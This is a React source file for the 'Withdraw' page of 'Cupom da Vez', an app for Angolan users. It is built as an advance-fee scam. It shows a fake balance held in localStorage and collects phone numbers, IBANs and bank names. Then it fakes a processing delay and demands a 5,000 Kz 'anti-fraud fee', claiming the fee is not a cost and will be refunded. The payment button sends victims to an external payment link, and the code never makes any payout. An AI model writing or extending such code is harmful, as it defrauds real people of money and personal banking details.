import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Card } from "@/components/ui/card";
import { Dialog, DialogContent } from "@/components/ui/dialog";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import Header from "@/components/Header";
import { toast } from "sonner";
import { Shield, AlertTriangle, Loader2, CheckCircle2 } from "lucide-react";
import Logo from "@/components/Logo";
import Video1Step from "@/components/Video1Step";
import Video2Step from "@/components/Video2Step";

type PaymentMethod = "iban" | "multicaixa";
type WithdrawStep = "form" | "processing" | "security" | "video1" | "video2" | "payment" | "generating";

const StepIndicator = ({ current }: { current: WithdrawStep }) => {
  const steps: WithdrawStep[] = ["form", "security", "video1", "video2", "payment"];
  const idx = steps.indexOf(current);
  return (
    <div className="flex items-center justify-center gap-1.5 mb-6 animate-fadeInDown">
      {steps.map((s, i) => (
        <div key={s} className="flex items-center gap-1.5">
          <div
            className={`w-2.5 h-2.5 rounded-full transition-all duration-500 ${
              i < idx
                ? "bg-success scale-100"
                : i === idx
                ? "bg-primary scale-125 animate-pulseGlowPrimary"
                : "bg-border scale-90"
            }`}
          />
          {i < steps.length - 1 && (
            <div className={`w-6 h-0.5 rounded transition-all duration-500 ${i < idx ? "bg-success" : "bg-border"}`} />
          )}
        </div>
      ))}
    </div>
  );
};

const Withdraw = () => {
  const navigate = useNavigate();
  const [userName, setUserName] = useState("");
  const [totalBalance, setTotalBalance] = useState(0);
  const [paymentMethod, setPaymentMethod] = useState<PaymentMethod>("multicaixa");
  const [phoneNumber, setPhoneNumber] = useState("");
  const [currentStep, setCurrentStep] = useState<WithdrawStep>("form");

  // IBAN fields
  const [selectedBank, setSelectedBank] = useState("");
  const [ibanNumber, setIbanNumber] = useState("");

  // Payment form fields
  const [fullName, setFullName] = useState("");
  const [email, setEmail] = useState("");
  const [contactNumber, setContactNumber] = useState("");
  const [multicaixaRef, setMulticaixaRef] = useState("");

  useEffect(() => {
    const name = localStorage.getItem("userName");
    if (!name) { navigate("/"); return; }
    setUserName(name);
    const balance = parseInt(localStorage.getItem("totalBalance") || "0");
    setTotalBalance(balance);
  }, [navigate]);

  const handleWithdraw = () => {
    if (paymentMethod === "multicaixa") {
      if (!phoneNumber.trim() || phoneNumber.length < 9) {
        toast.error("Por favor, insira um número de telefone válido");
        return;
      }
    } else if (paymentMethod === "iban") {
      if (!selectedBank) { toast.error("Por favor, selecione o seu banco"); return; }
      if (!ibanNumber.trim() || ibanNumber.length < 10) { toast.error("Por favor, insira um IBAN válido"); return; }
    }
    setCurrentStep("processing");
    setTimeout(() => setCurrentStep("security"), 2000);
  };

  const handleSecurityConfirm = () => setCurrentStep("video1");
  const handleVideo1Complete = () => setCurrentStep("video2");
  const handleVideo2Complete = () => setCurrentStep("payment");

  const handlePaymentSubmit = () => {
    if (!fullName || !email || !contactNumber || !multicaixaRef) {
      toast.error("Por favor, preencha todos os campos");
      return;
    }
    setCurrentStep("generating");
    setTimeout(() => { toast.success("Código de pagamento gerado com sucesso!"); }, 3000);
  };

  return (
    <div className="min-h-screen bg-gradient-welcome">
      {currentStep !== "video1" && <Header userName={userName} balance={totalBalance} />}

      {/* ─── FORM STEP ─────────────────────────────────────── */}
      {currentStep === "form" && (
        <div className="container mx-auto px-4 pt-24 pb-8">
          <StepIndicator current="form" />
          <div className="max-w-2xl mx-auto space-y-6">

            <div className="text-center space-y-2 animate-fadeInDown">
              <h1 className="text-display-md">Solicitar Saque</h1>
              <p className="text-body-lg text-muted-foreground">Sistema de Pagamento Seguro 🔐</p>
            </div>

            <div className="space-y-5">
              {/* Balance display */}
              <div className="text-center space-y-2 animate-scaleIn delay-100">
                <p className="text-lg font-semibold text-foreground">Valor Disponível:</p>
                <div className="relative bg-success/10 border-2 border-success rounded-2xl p-6 animate-pulseGlow overflow-hidden">
                  <div
                    className="absolute inset-0 pointer-events-none"
                    style={{
                      background: "linear-gradient(90deg, transparent, rgba(255,255,255,0.15), transparent)",
                      backgroundSize: "200% 100%",
                      animation: "shimmer 2.5s infinite",
                    }}
                  />
                  <p className="relative text-4xl font-black text-success">
                    Kz {totalBalance.toLocaleString()}
                  </p>
                </div>
              </div>

              {/* Payment method cards */}
              <div className="space-y-3 animate-fadeInUp delay-200">
                <label className="text-sm font-medium text-foreground">
                  Escolha o método de saque:
                </label>
                <div className="grid grid-cols-2 gap-4">
                  {(["iban", "multicaixa"] as PaymentMethod[]).map((method) => {
                    const isSelected = paymentMethod === method;
                    const icon = method === "iban" ? "🏦" : "💳";
                    const label = method === "iban" ? "IBAN Bancário" : "Multicaixa Express";
                    const color = method === "iban" ? "primary" : "info";
                    return (
                      <Card
                        key={method}
                        className={`p-6 cursor-pointer card-hover transition-all duration-300 ${
                          isSelected
                            ? `border-2 border-${color} bg-${color}/5 shadow-lg`
                            : `border-2 border-border hover:border-${color}/50`
                        }`}
                        onClick={() => setPaymentMethod(method)}
                      >
                        <div className="text-center space-y-2">
                          <div className={`text-3xl transition-transform duration-300 ${isSelected ? "animate-float" : ""}`}>
                            {icon}
                          </div>
                          <p className="font-semibold text-card-foreground text-sm">{label}</p>
                          {isSelected && (
                            <CheckCircle2 className={`w-4 h-4 mx-auto text-${color} animate-bounceIn`} />
                          )}
                        </div>
                      </Card>
                    );
                  })}
                </div>
              </div>

              {/* Phone input */}
              {paymentMethod === "multicaixa" && (
                <div className="space-y-2 animate-fadeInUp">
                  <label className="text-sm font-medium text-foreground">
                    Número de Telefone (Express)
                  </label>
                  <Input
                    id="withdraw-phone-input"
                    type="tel"
                    inputMode="numeric"
                    autoComplete="tel"
                    placeholder="9XX XXX XXX"
                    value={phoneNumber}
                    onChange={(e) => setPhoneNumber(e.target.value.replace(/\D/g, ""))}
                    className="h-12 transition-all duration-200 focus:scale-[1.01]"
                    maxLength={9}
                  />
                </div>
              )}

              {/* IBAN inputs */}
              {paymentMethod === "iban" && (
                <div className="space-y-4 animate-fadeInUp">
                  <div className="space-y-2">
                    <label className="text-sm font-medium text-foreground">Banco</label>
                    <Select value={selectedBank} onValueChange={setSelectedBank}>
                      <SelectTrigger className="h-12" id="withdraw-bank-select">
                        <SelectValue placeholder="Selecione o seu banco" />
                      </SelectTrigger>
                      <SelectContent>
                        {["BAI","BFA","BPC","BIC","BNI","BE (Banco Económico)","BCA (Banco Comercial Angolano)",
                          "Millennium Atlântico","Banco Sol","Banco Keve","Banco Valor",
                          "BIR (Banco de Investimento Rural)","Banco Yetu","Standard Bank Angola",
                          "Access Bank Angola","Standard Chartered Bank Angola",
                          "BCI (Banco de Comércio e Indústria)"].map((b) => (
                          <SelectItem key={b} value={b.split(" ")[0]}>{b}</SelectItem>
                        ))}
                      </SelectContent>
                    </Select>
                  </div>
                  <div className="space-y-2">
                    <label className="text-sm font-medium text-foreground">IBAN</label>
                    <div className="flex items-center gap-2">
                      <span className="text-lg font-semibold px-3 py-3 bg-muted rounded-lg h-12 flex items-center">
                        AO06
                      </span>
                      <Input
                        id="withdraw-iban-input"
                        type="text"
                        inputMode="numeric"
                        placeholder="Digite os números do seu IBAN"
                        value={ibanNumber}
                        onChange={(e) => setIbanNumber(e.target.value.replace(/\D/g, ""))}
                        className="h-12 flex-1"
                        maxLength={21}
                      />
                    </div>
                  </div>
                </div>
              )}

              <Button
                id="withdraw-confirm-btn"
                onClick={handleWithdraw}
                disabled={
                  (paymentMethod === "multicaixa" && phoneNumber.length < 9) ||
                  (paymentMethod === "iban" && (!selectedBank || ibanNumber.length < 10))
                }
                className="w-full h-14 text-lg font-bold btn-shimmer animate-fadeInUp delay-300 disabled:animate-none"
                style={{
                  background: "linear-gradient(135deg, hsl(199 89% 48%), hsl(199 89% 38%))",
                }}
              >
                💳 Confirmar e Sacar
              </Button>
            </div>
          </div>
        </div>
      )}

      {/* ─── SECURITY STEP ─────────────────────────────────── */}
      {currentStep === "security" && (
        <div className="container mx-auto px-4 pt-24 pb-8">
          <StepIndicator current="security" />
          <div className="max-w-3xl mx-auto animate-scaleIn">
            <div className="rounded-2xl overflow-hidden shadow-2xl border border-border/50">
              {/* Warning header */}
              <div className="bg-gradient-animated p-6 text-center text-white">
                <Shield className="w-12 h-12 mx-auto mb-3 animate-float" />
                <h2 className="text-display-md text-white">Confirmação de Segurança Necessária</h2>
              </div>

              <div className="bg-card p-8 space-y-5">
                <p className="text-center text-lg">
                  Antes de liberar o seu saque de{" "}
                  <span className="font-bold text-primary">💰 {totalBalance.toLocaleString()} Kz</span>
                </p>
                <p className="text-center text-foreground">
                  precisamos confirmar que você é uma pessoa real e não um robô.
                </p>
                <p className="text-muted-foreground text-center">
                  Para isso, o sistema exige um cadastro de segurança com uma{" "}
                  <strong>pequena taxa anti-fraude</strong>.
                </p>

                <div className="bg-success/10 border-2 border-success rounded-xl p-5 space-y-3 animate-fadeInUp delay-100 card-hover">
                  <p className="font-semibold text-success flex items-center gap-2">
                    ✅ Essa verificação existe para proteger o seu dinheiro contra:
                  </p>
                  <div className="space-y-1.5 text-sm text-foreground ml-6">
                    <p>✓ Robôs automáticos que estavam explorando o sistema</p>
                    <p>✓ Cadastros falsos que tentavam sacar valores indevidos</p>
                  </div>
                </div>

                <div className="bg-warning/10 border-2 border-warning rounded-xl p-5 space-y-3 animate-fadeInUp delay-200 card-hover">
                  <p className="font-semibold text-warning flex items-center gap-2">
                    <AlertTriangle className="w-5 h-5 animate-heartbeat" /> Importante:
                  </p>
                  <div className="space-y-1.5 text-sm text-foreground ml-6">
                    <p>✓ Essa taxa <strong>NÃO é um custo</strong>.</p>
                    <p>✓ Você recebe ela de volta junto com o valor do seu saque.</p>
                    <p>✓ Ou seja: o que é seu, <strong>volta garantido</strong>.</p>
                  </div>
                </div>

                <div className="text-center space-y-3 pt-2 animate-fadeInUp delay-300">
                  <p className="text-warning font-medium">🚀 Próximo passo</p>
                  <Button
                    id="security-confirm-btn"
                    onClick={handleSecurityConfirm}
                    className="w-full max-w-md h-14 text-lg font-bold btn-shimmer"
                    style={{ background: "linear-gradient(135deg, hsl(142 71% 45%), hsl(142 71% 35%))" }}
                  >
                    Ativar Cadastro e Liberar Saque ✅
                  </Button>
                </div>
              </div>
            </div>
            <p className="text-center text-sm text-muted-foreground mt-6">
              © 2026 Todos os direitos reservados — Cupom da Vez
            </p>
          </div>
        </div>
      )}

      {currentStep === "video1" && (
        <Video1Step totalBalance={totalBalance} onComplete={handleVideo1Complete} />
      )}

      {currentStep === "video2" && (
        <Video2Step totalBalance={totalBalance} />
      )}

      {/* ─── PAYMENT STEP ──────────────────────────────────── */}
      {currentStep === "payment" && (
        <div className="min-h-screen flex items-center justify-center px-4 py-8">
          <Card className="w-full max-w-md p-8 space-y-6 shadow-2xl border-border/50 animate-scaleIn">
            <div className="text-center space-y-4">
              <div className="w-24 h-24 mx-auto bg-gradient-primary rounded-full flex items-center justify-center shadow-lg animate-float">
                <Logo />
              </div>
              <h2 className="text-display-md text-info">Cupom da Vez</h2>
              <p className="text-lg">
                <span className="text-success font-bold">Pagamento para liberação do saque: 5.000 kz*</span>
              </p>
            </div>

            <div className="space-y-4">
              {[
                { id: "payment-fullname", label: "Nome Completo", placeholder: "O seu nome", value: fullName, setter: setFullName, type: "text" },
                { id: "payment-email", label: "E-mail", placeholder: "O seu melhor e-mail", value: email, setter: setEmail, type: "email" },
                { id: "payment-contact", label: "Número de Contacto", placeholder: "Ex: 923 456 789", value: contactNumber, setter: setContactNumber, type: "tel" },
              ].map(({ id, label, placeholder, value, setter, type }, i) => (
                <div key={id} className={`space-y-2 animate-fadeInUp delay-${(i + 1) * 100}`}>
                  <label className="text-sm font-medium text-muted-foreground">{label}</label>
                  <Input
                    id={id}
                    type={type}
                    placeholder={placeholder}
                    value={value}
                    onChange={(e) => setter(e.target.value)}
                    className="h-12 transition-all focus:scale-[1.01]"
                  />
                </div>
              ))}

              <div className="space-y-2 animate-fadeInUp delay-400">
                <Input
                  id="payment-multicaixa-ref"
                  placeholder="**Referência Multicaixa**"
                  value={multicaixaRef}
                  onChange={(e) => setMulticaixaRef(e.target.value)}
                  className="h-12 bg-muted border-l-4 border-l-info transition-all focus:scale-[1.01]"
                />
              </div>

              <Button
                id="payment-pay-btn"
                onClick={() => (window.location.href = "https://www.kintu.org/product/19d311d2-4533-4906-93a7-875a3bda38a8")}
                className="w-full h-14 text-lg font-bold btn-shimmer animate-fadeInUp delay-500"
                style={{ background: "linear-gradient(135deg, hsl(199 89% 48%), hsl(199 89% 38%))" }}
              >
                💳 Pagar a Taxa
              </Button>
            </div>
          </Card>
        </div>
      )}

      {/* ─── GENERATING STEP ───────────────────────────────── */}
      {currentStep === "generating" && (
        <div className="min-h-screen flex items-center justify-center px-4">
          <Card className="w-full max-w-md p-12 text-center space-y-6 shadow-2xl border-border/50 animate-scaleIn">
            <div className="w-24 h-24 mx-auto bg-gradient-primary rounded-full flex items-center justify-center shadow-lg animate-float">
              <Logo />
            </div>
            <h2 className="text-2xl font-bold text-info">Cupom da Vez</h2>
            <p className="text-lg">
              <span className="text-success font-bold">Pagamento para liberação do saque: 5.000 kz*</span>
            </p>
            <div className="py-8 relative flex justify-center">
              {/* Outer ring */}
              <div className="absolute w-20 h-20 rounded-full border-4 border-info/20 animate-spin-slow" />
              <Loader2 className="w-16 h-16 animate-spin text-info" />
            </div>
            <p className="text-info font-semibold animate-heartbeat">gerando referência...</p>
          </Card>
        </div>
      )}

      {/* ─── PROCESSING DIALOG ─────────────────────────────── */}
      <Dialog open={currentStep === "processing"}>
        <DialogContent className="sm:max-w-md border-0 overflow-hidden p-0">
          <div className="bg-gradient-animated p-1" />
          <div className="p-8 text-center space-y-6">
            <div className="relative flex justify-center">
              <div className="absolute w-24 h-24 rounded-full border-4 border-info/20 animate-spin-slow" />
              <Loader2 className="w-16 h-16 animate-spin text-info" />
            </div>
            <div className="space-y-2">
              <h3 className="text-2xl font-bold text-foreground">Processando Saque...</h3>
              <p className="text-muted-foreground">
                Aguarde um momento enquanto o sistema
                <br />confirma a transferência.
              </p>
            </div>
          </div>
        </DialogContent>
      </Dialog>
    </div>
  );
};

export default Withdraw;
